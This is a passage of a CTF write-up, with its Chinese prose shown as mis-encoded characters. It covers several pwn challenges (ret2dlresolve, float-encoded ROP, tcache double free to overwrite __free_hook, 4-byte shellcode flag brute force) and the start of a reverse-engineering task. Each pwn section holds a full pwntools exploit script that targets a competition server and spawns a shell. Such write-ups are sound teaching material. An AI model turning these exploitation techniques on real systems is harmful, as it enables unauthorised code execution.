title="stackpwn"></a>stackpwn</h3><p>å¯¼å…¥IDAåï¼Œå‘ç°æ²¡æœ‰putsã€writeç­‰ï¼Œåªæœ‰readä¸”æœ‰æº¢å‡ºï¼Œé‚£ä¹ˆè¿™é“é¢˜å°±æ˜¯å…¸å‹çš„è€ƒå¯Ÿret2dlresolveï¼Œç”¨ctf-wikiçš„è„šæœ¬æ”¹ä¸€ä¸‹å°±å¯ä»¥æ‹¿åˆ°shelläº†<br>åˆ©ç”¨roputilsç®€åŒ–æ”»å‡»</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from roputils import *</span><br><span class="line">from pwn import process</span><br><span class="line">from pwn import gdb</span><br><span class="line">from pwn import context</span><br><span class="line">from pwn import remote   <span class="comment">#r = process('./pwn3')</span></span><br><span class="line">r = remote(<span class="string">"47.110.227.208"</span>,10003)</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">rop = ROP('./pwn3')</span><br><span class="line">offset = 60</span><br><span class="line">bss_base = 0x804a000 + 0x800</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line">buf += rop.call('read', 0, bss_base, 100)</span><br><span class="line">buf += rop.dl_resolve_call(bss_base + 20, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line">buf = rop.string('/bin/sh')</span><br><span class="line">buf += rop.fill(20, buf)</span><br><span class="line">buf += rop.dl_resolve_data(bss_base + 20, 'system')</span><br><span class="line">buf += rop.fill(100, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114455-69fd66c8-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114455-69fd66c8-a457-1.png" alt="img"></a></p><h3 id="floatpwn"><a href="#floatpwn" class="headerlink" title="floatpwn"></a>floatpwn</h3><p>è¿™é¢˜è€ƒå¯Ÿäº†ç¡®å®šæµ®ç‚¹å¯„å­˜å™¨é€šè¿‡movsså†™å…¥å†…å­˜æ—¶çš„æ•°å€¼<br>æ–¹æ³•ï¼šåªèƒ½äººå·¥äºŒåˆ†æ³•ä¸€æ¬¡ä¸€æ¬¡å»å°è¯•ï¼Œç„¶åå‘ç°å°æ•°ç‚¹å45ä½ä¹‹å‰å¯ä»¥å¿½ç•¥ä¸è®¡ï¼ŒçœŸæ­£å¼€å§‹æœ‰æ„ä¹‰çš„æ•°å€¼åœ¨å°æ•°ç‚¹å45ä½å¼€å§‹ã€‚ç„¶åæ±‚å‡ºå¯¹åº”çš„nä½¿å¾—å†™å›å†…å­˜æ—¶æ˜¯æˆ‘æƒ³è¦çš„æ•°å€¼ï¼Œä»è€Œæ„é€ ROPé“¾ã€‚ä½†æ˜¯æƒ³æ„é€ ROPé“¾ä¹‹å‰éœ€è¦å®ç°æ— é™å†™ï¼Œæ‰€ä»¥è¾“å…¥sizeæ—¶ï¼Œå¯ä»¥è€ƒè™‘è¾“å…¥è´Ÿæ•°ï¼Œå®ç°æ— ç¬¦å·æ•´æ•°æº¢å‡ºï¼Œä»è€Œæ— é™å†™ã€‚å› ä¸ºæ§åˆ¶å†™å…¥æ•°æ®ä½ç½®çš„iå˜é‡ä½äºæ ˆç©ºé—´åº•éƒ¨ï¼Œæ‰€ä»¥è¦ä½¿å¾—å†™åˆ°ié‡Œçš„æ•°æ®ä¸º10åˆ°12å³å¯ï¼Œå› ä¸ºå¯ä»¥è€ƒè™‘ç›´æ¥ç•¥è¿‡ebpï¼Œç›´æ¥ä¿®æ”¹ripã€‚</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">elf = ELF(<span class="string">"pwn2"</span>)</span><br><span class="line">sh = <span class="number">0</span></span><br><span class="line">lib = <span class="number">0</span></span><br><span class="line">def inputFloat(<span class="built_in">num</span>):</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.<span class="built_in">send</span>(<span class="built_in">num</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline()</span><br><span class="line">def inputRop(<span class="built_in">num</span>):</span><br><span class="line">    <span class="built_in">num</span> = str(<span class="built_in">num</span>)</span><br><span class="line">    <span class="built_in">num</span> = <span class="built_in">num</span>.rjust(<span class="number">45</span>,<span class="string">"0"</span>)</span><br><span class="line">    <span class="built_in">num</span> = <span class="built_in">num</span>.ljust(<span class="number">0x62</span>,<span class="string">"0"</span>)</span><br><span class="line">    inputFloat(<span class="string">"0."</span> + <span class="built_in">num</span>)</span><br><span class="line">    inputFloat(<span class="string">"0"</span>) </span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    <span class="built_in">global</span> sh</span><br><span class="line">    <span class="built_in">global</span> lib</span><br><span class="line">    <span class="keyword">if</span>(debug == <span class="number">1</span>):</span><br><span class="line">        sh = <span class="built_in">process</span>(<span class="string">"./pwn2"</span>)</span><br><span class="line">        lib = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF(<span class="string">"libc6_2.27-3ubuntu1_amd64.so"</span>)</span><br><span class="line">    <span class="comment">#puts 5879714 0x400640</span></span><br><span class="line">    <span class="comment">#pop_rdi 5881041 0x4009f3</span></span><br><span class="line">    <span class="comment">#__libc_start_main_got 8822026 0x601038</span></span><br><span class="line">    <span class="comment">#main 5880847 0x400969</span></span><br><span class="line">    <span class="comment">#start 5879938 0x4006E0</span></span><br><span class="line">    <span class="comment">#call vul 5880867 0x400977</span></span><br><span class="line">    <span class="comment">#vul 5880653 0x4008DE</span></span><br><span class="line">    <span class="comment">#read 5879781 0x400670</span></span><br><span class="line">    <span class="comment">#pop_rsi_r15_ret 5881038 0x4009f1</span></span><br><span class="line">    <span class="comment">#read_got 8822014 0x601030</span></span><br><span class="line">    <span class="comment">#binsh 8822106 0x601071</span></span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(<span class="string">"-1.9999"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">13</span>):</span><br><span class="line">        inputFloat(<span class="string">"111"</span>)</span><br><span class="line">    inputFloat(<span class="string">"13"</span>)</span><br><span class="line">    inputFloat(<span class="string">"13"</span>)</span><br><span class="line">    inputFloat(<span class="string">"0."</span> + <span class="string">"0"</span> * <span class="number">43</span> + <span class="string">"23"</span>)<span class="comment">#0x11</span></span><br><span class="line">    inputFloat(<span class="string">"0."</span> + <span class="string">"0"</span> * <span class="number">43</span> + <span class="string">"23"</span>)<span class="comment">#fake</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#rip = 0x4009f3</span></span><br><span class="line">    <span class="comment">#pop_rdi_ret</span></span><br><span class="line">    inputRop(<span class="number">5881041</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#__libc_start_main got</span></span><br><span class="line">    inputRop(<span class="number">8822026</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#puts_plt</span></span><br><span class="line">    inputRop(<span class="number">5879714</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#pop_rdi_ret</span></span><br><span class="line">    inputRop(<span class="number">5881041</span>)</span><br><span class="line">    inputRop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#pop_rsi_r15_ret</span></span><br><span class="line">    inputRop(<span class="number">5881038</span>)</span><br><span class="line">    inputRop(<span class="number">8822106</span>)</span><br><span class="line">    inputRop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#read_plt</span></span><br><span class="line">    inputRop(<span class="number">5879781</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#pop_rdi_ret</span></span><br><span class="line">    inputRop(<span class="number">5881041</span>)</span><br><span class="line">    inputRop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#pop_rsi_r15_ret</span></span><br><span class="line">    inputRop(<span class="number">5881038</span>)</span><br><span class="line">    inputRop(<span class="number">8822014</span>)</span><br><span class="line">    inputRop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#read_plt</span></span><br><span class="line">    inputRop(<span class="number">5879781</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#pop_rdi_ret</span></span><br><span class="line">    inputRop(<span class="number">5881041</span>)</span><br><span class="line">    inputRop(<span class="number">8822106</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#read_plt</span></span><br><span class="line">    inputRop(<span class="number">5879781</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#input()</span></span><br><span class="line">    sh.recvuntil(<span class="string">"plz input your float:"</span>)</span><br><span class="line">    sh.sendline(<span class="string">"0"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"do you want to continue?(y/n)"</span>)</span><br><span class="line">    sh.<span class="built_in">send</span>(<span class="string">"n"</span>)</span><br><span class="line"></span><br><span class="line">    __libc_start_main = u64(sh.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">    libc = __libc_start_main - lib.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    <span class="keyword">system</span> = libc + lib.symbols[<span class="string">'system'</span>]</span><br><span class="line">    binsh = libc + lib.search(<span class="string">"/bin/sh\x00"</span>).next()</span><br><span class="line">    sh.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sh.sendline(p64(<span class="keyword">system</span>))</span><br><span class="line">    <span class="built_in">log</span>.success(<span class="string">"__libc_start_main: "</span> + hex(__libc_start_main))</span><br><span class="line">    <span class="built_in">log</span>.success(<span class="string">"system: "</span> + hex(<span class="keyword">system</span>))</span><br><span class="line">    <span class="built_in">log</span>.success(<span class="string">"binsh: "</span> + hex(binsh))</span><br><span class="line">    <span class="built_in">log</span>.success(<span class="string">"libc: "</span> + hex(libc))</span><br><span class="line">    sh.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    pwn(<span class="string">"47.110.227.208"</span>,<span class="number">10002</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114506-706c344e-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114506-706c344e-a457-1.png" alt="img"></a></p><h3 id="Babytcache"><a href="#Babytcache" class="headerlink" title="Babytcache"></a>Babytcache</h3><p>checksec å¯ä»¥çœ‹åˆ°ç¨‹åºæ²¡æœ‰å¼€PIE,åŒæ—¶bssä¸­å­˜æ”¾äº†_IO_2_1_stdout_çš„åœ°å€,å¹¶ä¸”libc2.27æœ‰double free,æ‰€ä»¥æ€è·¯å°±å¾ˆæ˜ç¡®äº†.æœ‰äº†double freeå°±å¯ä»¥malloc 2 everywhere,æ‰€ä»¥è¿™æ ·ä¸€çš„éš¾ç‚¹åœ¨äºå¦‚ä½•leak libc,é€šè¿‡double free,å¯ä»¥è®©fdæŒ‡å‘_IO_2_1<em>stdout</em>,ä»è€Œmalloc 2 _IO_2_1<em>stdout</em>,ä»è€Œä¿®æ”¹write_baseæ¥leak libc,ä¹‹åå†double freeå»ä¿®æ”¹free_hookä¸ºsystem,å»freeä¸€ä¸ª/bin/shå°±å¯ä»¥äº†</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">libc=ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"><span class="keyword">sh</span>=remote(<span class="string">"47.110.227.208"</span>,<span class="number">10006</span>)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(size,content):</span><br><span class="line">    <span class="keyword">sh</span>.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your size:'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(size))</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your message:'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.send(content)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">def add2(size,content):</span><br><span class="line">    <span class="keyword">sh</span>.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your size:'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(size))</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your message:'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.send(content)</span><br><span class="line">    #sh.recvuntil(<span class="string">'Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">def <span class="keyword">delete</span>(<span class="built_in">index</span>):</span><br><span class="line">    <span class="keyword">sh</span>.sendline(<span class="string">'2'</span>)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input the index: '</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(<span class="built_in">index</span>))</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,<span class="string">'a\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,<span class="string">'a\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,<span class="string">'a\n'</span>)</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,p64(<span class="number">0</span>x0000000000602020)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,p64(<span class="number">0</span>x0000000000602020)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x100,<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    add2(<span class="number">0</span>x100,p64(<span class="number">0</span>xfbad1880)+p64(<span class="number">0</span>x0)*<span class="number">3</span>+<span class="string">'\x20\n'</span>)</span><br><span class="line">    libc_base=u64(<span class="keyword">sh</span>.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)-<span class="number">0</span>x3eb780</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"libc_base -&gt; "</span> + hex(libc_base)</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    <span class="built_in">system</span>=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'Done!\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x10,<span class="string">'/bin/sh\x00\n'</span>) # <span class="built_in">index</span> <span class="number">7</span></span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x20,<span class="string">'\n'</span>) # <span class="built_in">index</span> <span class="number">8</span></span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">8</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x20,p64(free_hook)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x20,p64(free_hook)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="built_in">add</span>(<span class="number">0</span>x20,p64(<span class="built_in">system</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712115336-a027c15c-a458-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712115336-a027c15c-a458-1.png" alt="img"></a></p><h3 id="codepwn"><a href="#codepwn" class="headerlink" title="codepwn"></a>codepwn</h3><p>é€šè¿‡é€†å‘å¯ä»¥å‘ç°ç¨‹åºå°†flagå­˜å…¥äº†å†…å­˜ä¸­,å¹¶ä¸”æˆ‘ä»¬å¯ä»¥é€‰æ‹©flagå¯¹åº”çš„ä¸‹æ ‡è¿›è¡Œå¯¹æ¯”,å¯æ˜¯4å­—èŠ‚çš„shellcodeæœ‰ç€é™åˆ¶,å¹¶ä¸”v5æ˜¯call shellcodeä¹‹åçš„è¿”å›å€¼,é‚£ä¹ˆå°±å¿…é¡»åœ¨shellcodeä¸­å¯¹raxè¿›è¡Œèµ‹å€¼æ“ä½œ,å¯ä»¥è§‚å¯Ÿåˆ°r9å¯„å­˜å™¨çš„å¤§å°æ˜¯è·Ÿprintfå‡ºæ¥çš„å­—èŠ‚æ•°ç›¸å…³,é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡push r9,pop rax,ret,ä¸‰ä¸ªæ“ä½œæ¥å¯¹raxèµ‹å€¼,è¿›è€Œæ ¹æ®ç¨‹åºæœ€åçš„åˆ¤æ–­æ¥ç¡®è®¤æˆ‘ä»¬çŒœæµ‹çš„flagå¯¹åº”ä¸‹æ ‡çš„é‚£ä¸ªå­—æ¯æ˜¯å¦æ­£ç¡®,æ¥ä¸‹æ¥å°±æ˜¯çˆ†ç ´å°±å®Œäº‹äº†</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'CRITICAL'</span> </span><br><span class="line"></span><br><span class="line">def flag_index(<span class="built_in">index</span>): </span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(<span class="built_in">index</span>)) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def code(code): </span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.send(code) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def name(size,content): </span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'tell me your name size:\n'</span>) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(size)) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">'input your name:\n'</span>) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.sendline(content) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag=<span class="keyword">open</span>(<span class="string">'./pwn4_flag'</span>,<span class="string">'a+'</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">index</span> in <span class="built_in">range</span>(<span class="number">32</span>): </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">0</span>x1,<span class="number">0</span>x7f): </span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>=remote(<span class="string">'47.110.227.208'</span>,<span class="number">10004</span>) </span><br><span class="line"></span><br><span class="line">            #sh=process(<span class="string">'./pwn4'</span>) </span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>.recvuntil(<span class="string">'this is my gift for you, take it!\n'</span>) </span><br><span class="line"></span><br><span class="line">            flag_index(<span class="built_in">index</span>) </span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>.recvuntil(<span class="string">'input your code:\n'</span>) </span><br><span class="line"></span><br><span class="line">            code(<span class="string">'AQX\xC3'</span>) </span><br><span class="line"></span><br><span class="line">            padding=<span class="string">'a'</span>.ljust(i,<span class="string">'a'</span>) </span><br><span class="line"></span><br><span class="line">            name(<span class="number">0</span>x100,padding) </span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>.recvuntil(<span class="string">'Hello are you ready? '</span>+padding+<span class="string">'\n'</span>) </span><br><span class="line"></span><br><span class="line">            <span class="keyword">sh</span>.sendline() </span><br><span class="line"></span><br><span class="line">            info = <span class="keyword">sh</span>.recv() </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>((info).<span class="keyword">find</span>(<span class="string">'bye!'</span>) != -<span class="number">1</span>): </span><br><span class="line"></span><br><span class="line">                <span class="keyword">print</span>  chr(i+<span class="number">0</span>x16) </span><br><span class="line"></span><br><span class="line">                flag.<span class="keyword">write</span>(chr(i+<span class="number">0</span>x16)) </span><br><span class="line"></span><br><span class="line">                <span class="keyword">sh</span>.<span class="keyword">close</span>() </span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span> </span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>: </span><br><span class="line"></span><br><span class="line">                <span class="keyword">sh</span>.<span class="keyword">close</span>() </span><br><span class="line"></span><br><span class="line">except KeyboardInterrup<span class="variable">t:</span> </span><br><span class="line"></span><br><span class="line">    flag.<span class="keyword">close</span>() </span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">excep<span class="variable">t:</span> </span><br><span class="line"></span><br><span class="line">    flag.<span class="keyword">close</span>() </span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712115357-acb3b9d0-a458-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712115357-acb3b9d0-a458-1.png" alt="img"></a></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h3><p>ï¼ˆemmmè¿™ä¸€é¢˜å·æ‡’äº†ï¼‰ï¼Œ<br>é¦–å…ˆåˆ†æä¸»å‡½æ•°<br>é‡Œé¢æœ‰ä¸¤ä¸ªcheckå‡½æ•°ã€‚è¿›å…¥checktimeï¼ˆï¼‰å‡½æ•°ï¼Œå…³é”®ä»£ç æ˜¯è¿™é‡Œï¼Œ</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*(&amp;v5 + i) = rand();</span><br><span class="line">  if ( <span class="number">14766</span> * v11 + <span class="number">18242</span> * v10 + <span class="number">4657</span> * v9 + <span class="number">22453</span> * v8 + <span class="number">7236</span> * v7 + <span class="number">28554</span> * v6 + <span class="number">25606</span> * v5 + <span class="number">12289</span> * v12 == <span class="number">12977737</span></span><br><span class="line">    &amp;&amp; <span class="number">27429</span> * v11 + <span class="number">8015</span> * v10 + <span class="number">16511</span> * v9 + <span class="number">17180</span> * v8 + <span class="number">27141</span> * v7 + <span class="number">31813</span> * v6 + <span class="number">7412</span> * v5 + <span class="number">18249</span> * v12 == <span class="number">15081473</span></span><br><span class="line">    &amp;&amp; <span class="number">2846</span> * v11 + <span class="number">28353</span> * v10 + <span class="number">19864</span> * v9 + <span class="number">27377</span> * v8 + <span class="number">9006</span> * v7 + <span class="number">13657</span> * v6 + <span class="number">19099</span> * v5 + <span class="number">25835</span> * v12 == <span class="number">13554960</span></span><br><span class="line">    &amp;&amp; <span 